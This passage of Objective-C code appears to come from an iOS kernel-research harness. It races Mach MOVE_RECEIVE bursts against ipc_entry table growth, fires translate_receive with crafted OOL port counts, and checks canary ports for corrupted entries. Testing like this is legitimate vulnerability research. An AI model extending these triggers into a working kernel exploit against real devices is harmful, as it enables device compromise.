    [report appendFormat:@"MOVE_RECEIVE send_kr=0x%x\n", (unsigned)moveSend];

    // Receive to trigger translate_receive
    uint8_t moveRx2[256] = {0};
    mach_msg_header_t *rxh = (mach_msg_header_t *)moveRx2;
    kern_return_t moveRecv = mach_msg(rxh, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                       sizeof(moveRx2), port, 50, MACH_PORT_NULL);
    [report appendFormat:@"MOVE_RECEIVE recv_kr=0x%x\n", (unsigned)moveRecv];

    // Check canaries with precise oracle
    int mutations = 0;
    for (int i = 0; i < PRECISE_N; i++) {
        mach_port_type_t ptype_now = 0;
        mach_port_urefs_t prefs_now = 0;
        kern_return_t kr1 = mach_port_type(mach_task_self(), pcanary[i], &ptype_now);
        kern_return_t kr2 = mach_port_get_refs(mach_task_self(), pcanary[i], MACH_PORT_RIGHT_SEND, &prefs_now);
        if (kr1 != KERN_SUCCESS || kr2 != KERN_SUCCESS ||
            ptype_now != ptype_before[i] || prefs_now != prefs_before[i]) {
            [report appendFormat:@"  MUTATION canary[%d] port=0x%x (idx=%u): type 0x%x->0x%x, srefs %u->%u\n",
             i, pcanary[i], pcanary[i] >> 8,
             ptype_before[i], ptype_now, prefs_before[i], prefs_now];
            mutations++;
        }
    }
    [report appendFormat:@"ie_bits mutations: %d/%d\n", mutations, PRECISE_N];

    for (int i = 0; i < PRECISE_N; i++) mach_port_destroy(mach_task_self(), pcanary[i]);
    mach_port_destroy(mach_task_self(), moveRx);
    mach_port_destroy(mach_task_self(), auxSend);

    // --- boundary race: MOVE_RECEIVE burst vs ipc_entry_grow_table (ollie) ---
    // Thread 1 receives a 64-descriptor MOVE_RECEIVE burst at table_size-1;
    // Thread 2 spams mach_port_allocate/destroy so grow_table fires in the
    // same window. Precise ie_bits oracle on 64 canaries catches a hit.
    [report appendString:@"\n--- boundary race: MOVE_RECEIVE burst vs grow_table ---\n"];
    NSDictionary *preRace = [self portSpaceBasicSnapshot];
    uint32_t raceSize = [preRace[@"table_size"] unsignedIntValue];
    uint32_t raceInUse = [preRace[@"table_inuse"] unsignedIntValue];
    [report appendFormat:@"pre-race: size=%u inuse=%u\n", raceSize, raceInUse];

    NSMutableArray *fillers = [NSMutableArray array];
    uint32_t raceTarget = (raceSize > 1) ? raceSize - 1 : raceSize;
    while (raceInUse + fillers.count < raceTarget && fillers.count < 4096) {
        mach_port_t fp = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &fp) != KERN_SUCCESS) break;
        [fillers addObject:@(fp)];
    }

    #define RACE_CANARY_N 64
    mach_port_t rcn[RACE_CANARY_N];
    mach_port_type_t rct[RACE_CANARY_N];
    mach_port_urefs_t rcr[RACE_CANARY_N];
    for (int i = 0; i < RACE_CANARY_N; i++) {
        rcn[i] = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &rcn[i]);
        mach_port_insert_right(mach_task_self(), rcn[i], rcn[i], MACH_MSG_TYPE_MAKE_SEND);
        mach_port_type(mach_task_self(), rcn[i], &rct[i]);
        mach_port_get_refs(mach_task_self(), rcn[i], MACH_PORT_RIGHT_SEND, &rcr[i]);
    }

    __block volatile int churnRun = 1;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        NSMutableArray *scratch = [NSMutableArray array];
        while (churnRun) {
            mach_port_t cp = MACH_PORT_NULL;
            if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &cp) == KERN_SUCCESS) {
                [scratch addObject:@(cp)];
                if (scratch.count > 256) {
                    mach_port_t old = (mach_port_t)[scratch.firstObject unsignedIntValue];
                    [scratch removeObjectAtIndex:0];
                    mach_port_destroy(mach_task_self(), old);
                }
            }
        }
        for (NSNumber *np in scratch) mach_port_destroy(mach_task_self(), (mach_port_t)np.unsignedIntValue);
    });

    // Three bursts while churn forces grow_table — each receive of 32
    // MOVE_RECEIVE names allocates 32 fresh ipc_entries inside copyout, so the
    // boundary crossing happens in the copyout window (ollie's race shape).
    int totalInflight = 0;
    for (int br = 0; br < 3; br++) {
        NSDictionary *raceBurst = [self sendReceiveMoveBurst:32 port:port];
        [report appendFormat:@"race burst[%d]: send=%@ recv=%@ inflight_cleared=%@\n",
         br, raceBurst[@"send_kr"], raceBurst[@"recv_kr"], raceBurst[@"inflight_recv_bit_cleared"]];
        totalInflight += [raceBurst[@"inflight_recv_bit_cleared"] intValue];
    }
    churnRun = 0;
    usleep(80000); // let the churn loop drain its scratch list
    [report appendFormat:@"race inflight recv-bit cleared: %d (ollie in-flight oracle)\n", totalInflight];
    NSDictionary *postRace = [self portSpaceBasicSnapshot];
    [report appendFormat:@"post-race: size=%u inuse=%u grew=%d\n",
     [postRace[@"table_size"] unsignedIntValue], [postRace[@"table_inuse"] unsignedIntValue],
     [postRace[@"table_size"] unsignedIntValue] > raceSize ? 1 : 0];

    int raceMut = 0;
    for (int i = 0; i < RACE_CANARY_N; i++) {
        mach_port_type_t t2 = 0;
        mach_port_urefs_t r2 = 0;
        kern_return_t k1 = mach_port_type(mach_task_self(), rcn[i], &t2);
        kern_return_t k2 = mach_port_get_refs(mach_task_self(), rcn[i], MACH_PORT_RIGHT_SEND, &r2);
        if (k1 != KERN_SUCCESS || k2 != KERN_SUCCESS || t2 != rct[i] || r2 != rcr[i]) {
            [report appendFormat:@"  RACE MUTATION canary[%d] port=0x%x (idx=%u): type 0x%x->0x%x srefs %u->%u\n",
             i, rcn[i], rcn[i] >> 8, rct[i], t2, rcr[i], r2];
            raceMut++;
        }
    }
    [report appendFormat:@"race ie_bits mutations: %d/%d\n", raceMut, RACE_CANARY_N];
    if (raceMut > 0) {
        [report appendString:@"RACE_MUTATION_UNVERIFIED — independent table evidence required for attribution.\n"];
    }
    for (int i = 0; i < RACE_CANARY_N; i++) mach_port_destroy(mach_task_self(), rcn[i]);
    for (NSNumber *np in fillers) mach_port_destroy(mach_task_self(), (mach_port_t)np.unsignedIntValue);

    // Allocate 128 canary ports. Snapshot their urefs. Trigger translate_receive
    // with various w2 values (OOL counts). Snapshot again. Any delta = bit-set hit.
    [report appendString:@"\n--- translate_receive bit-set canary (128 ports) ---\n"];
    [report appendFormat:@"DEBUG: pid=%d — attach debugserver now, 5s window\n", getpid()];
    [self journal:[NSString stringWithFormat:@"DEBUG pid=%d — attach debugserver", getpid()]];
    fflush(stdout);
    sleep(5);  // short window — iOS watchdog kills UI apps after ~10s unresponsive
    #define CANARY_N 128
    mach_port_t canary[CANARY_N];
    uint32_t canaryAlive[CANARY_N];
    for (int i = 0; i < CANARY_N; i++) {
        canary[i] = MACH_PORT_NULL;
        kern_return_t ckr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &canary[i]);
        if (ckr == KERN_SUCCESS) {
            mach_port_insert_right(mach_task_self(), canary[i], canary[i], MACH_MSG_TYPE_MAKE_SEND);
            canaryAlive[i] = 1;
        } else {
            canaryAlive[i] = 0;
        }
    }

    // Snapshot: try to send to each canary port (alive check)
    uint8_t pingBuf[256];
    for (int i = 0; i < CANARY_N; i++) {
        if (!canaryAlive[i]) continue;
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) canaryAlive[i] = 2; // was already dead
        else {
            // drain
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    int aliveBefore = 0;
    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveBefore++;
    [report appendFormat:@"canary before: %d/%d alive\n", aliveBefore, CANARY_N];
    // Log port names so we can see the range
    for (int i = 0; i < CANARY_N && i < 8; i++) {
        [report appendFormat:@"  canary[%d] port=%u\n", i, canary[i]];
    }
    [self journal:[NSString stringWithFormat:@"canary_names sample: %u %u %u %u",
                   canary[0], canary[1], canary[2], canary[3]]];

    // Trigger translate_receive using canary NAME>>8 as w2.
    // XNU port names: (index << 8) | generation. w2 = index = name >> 8.
    // If w2 = name>>8, bit-set at table[name>>8] hits this port's entry.
    [report appendString:@"\n--- targeted bit-set: name>>8 as w2 ---\n"];
    int targeted = 0, targetedDead = 0, oolSendFails = 0, skippedNoSendRight = 0;
    for (int i = 0; i < CANARY_N; i += 4) {
        if (canaryAlive[i] != 1) continue;
        uint32_t name = (uint32_t)canary[i];
        uint32_t w2 = name >> 8;  // XNU index component
        if (w2 == 0) continue;
        // Per ollie: churned ports may have no send right; that failure is
        // lifecycle noise, not a bit-set signal. Ensure the right first.
        kern_return_t esr = ensure_send_right(canary[i]);
        if (esr != KERN_SUCCESS) {
            skippedNoSendRight++;
            [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u SKIPPED ensure_send_right kr=%d",
                           w2, canary[i], esr]];
            continue;
        }
        NSDictionary *tr = [self sendOOLPortsCount:w2 realEntries:64 port:port sendRight:port useSpray:NO];
        targeted++;
        if ([tr[@"send_kr"] intValue] != KERN_SUCCESS) {
            oolSendFails++;
        }
        [self journal:[NSString stringWithFormat:@"targeted w2=%u port=%u send_kr=%@ recv_kr=%@",
                       w2, canary[i], tr[@"send_kr"], tr[@"recv_kr"]]];

        // Immediately check THIS port
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) {
            targetedDead++;
            [report appendFormat:@"TARGETED CANARY PING FAILURE: port=%u w2=%u after trigger (send_kr=%d)\n",
             canary[i], w2, skr];
        } else {
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    [report appendFormat:@"targeted result: %d attempts, %d ool send failures, %d canary ping failures, %d skipped (no send right)\n",
     targeted, oolSendFails, targetedDead, skippedNoSendRight];
    if (targetedDead > 0 || oolSendFails > 0) {
        [report appendString:@"Send failures are unverified lifecycle signals; w2 source and bit-set attribution are not proven.\n"];
    } else {
        [report appendString:@"No targeted send-status delta observed; this does not identify or exclude an index source.\n"];
    }


    // Earlier w2 discovery and OOB-value tests were removed after app crashes.
    // See journal for threshold sweep and canary results.

    // Snapshot again
    int changed = 0;
    for (int i = 0; i < CANARY_N; i++) {
        if (canaryAlive[i] != 1) continue;
        memset(pingBuf, 0, sizeof(pingBuf));
        mach_msg_header_t *ph = (mach_msg_header_t *)pingBuf;
        ph->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
        ph->msgh_size = sizeof(mach_msg_header_t);
        ph->msgh_remote_port = canary[i];
        ph->msgh_local_port = MACH_PORT_NULL;
        ph->msgh_id = 0;
        kern_return_t skr = mach_msg(ph, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     ph->msgh_size, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
        if (skr != KERN_SUCCESS) {
            changed++;
            canaryAlive[i] = 2;
            [report appendFormat:@"canary[%d] port=%u send failure after trigger (send_kr=%d)\n", i, canary[i], skr];
        } else {
            mach_msg(ph, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(pingBuf), canary[i], 50, MACH_PORT_NULL);
        }
    }
    int aliveAfter = 0;
    for (int i = 0; i < CANARY_N; i++) if (canaryAlive[i] == 1) aliveAfter++;
    [report appendFormat:@"canary after: %d/%d send-capable (status_changes=%d)\n", aliveAfter, CANARY_N, changed];
    if (changed > 0) {
        [report appendString:@"CANARY_SEND_FAILURES_UNVERIFIED — independent table evidence is required for attribution.\n"];
    } else {
        [report appendString:@"No canary send-status delta observed; no bit-set conclusion follows either way.\n"];
    }

    // Cleanup canaries
    for (int i = 0; i < CANARY_N; i++) {
        if (canary[i] != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), canary[i]);
    }

    [report appendString:@"\n--- itable churn + burst (growth boundary) ---\n"];
    for (int round = 0; round < 4; round++) {
        [self churnItableWithPorts:held count:256];
        for (int i = 0; i < 16; i++) {
            NSDictionary *r = [self sendReceiveCount:16 port:port sendRight:port];
            if ([r[@"recv_kr"] intValue] != 0 && [r[@"send_kr"] intValue] != 0) {
                [report appendFormat:@"round=%d burst=%d -> %@\n", round, i, r];
            }
        }
    }
    [self journal:[NSString stringWithFormat:@"CHURN_DONE held=%d", (int)held.count]];

    for (NSNumber *p in held) {
        mach_port_destroy(mach_task_self(), (mach_port_t)p.unsignedIntValue);
    }
    mach_port_destroy(mach_task_self(), port);

    [report appendString:@"\nVERDICT: SEE_JOURNAL\n"];
    [report appendString:
     @"Matrix reading:\n"
     @"  simple=0, complex fails    -> descriptor layout/filter is the cause\n"
     @"  complex0-id0 fails too     -> COMPLEX bit itself is filtered\n"
     @"  id0 works, id4b50 fails    -> msgh_id filtering (iOS mach message filter)\n"
     @"  everything works           -> the earlier failure was the 16B stride\n"
     @"Growth rounds report table_size/table_inuse before and after allocation/free.\n"
     @"Accepted messages and send failures are observations, not OOB/UAF proof.\n"
     @"A panic requires independent symbolication and index/base correlation before attribution.\n"];
    return report;
}

@end
